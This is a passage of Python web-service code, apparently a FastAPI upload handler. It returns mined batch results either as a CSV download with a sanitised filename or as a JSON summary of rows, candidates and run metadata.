            w.writerow({k: r.get(k, "") for k in fields})
        fname = re.sub(r"[^A-Za-z0-9._-]+", "_",
                       (file.filename or "batch").rsplit(".", 1)[0]) \
                       + "_nivxray_mined_results.csv"
        return Response(
            content=buf.getvalue(),
            media_type="text/csv",
            headers={"Content-Disposition": f'attachment; filename="{fname}"'},
        )

    return {
        "filename":       file.filename or "upload",
        "size_bytes":     mined["size_bytes"],
        "total":          len(rows),
        "analysis_mode":  analysis_mode,
        "summary":        summary,
        "rows":           rows,
        "run_id":         run_id,
        "candidates_all": mined["candidates"],       # for optional analyst review
    }
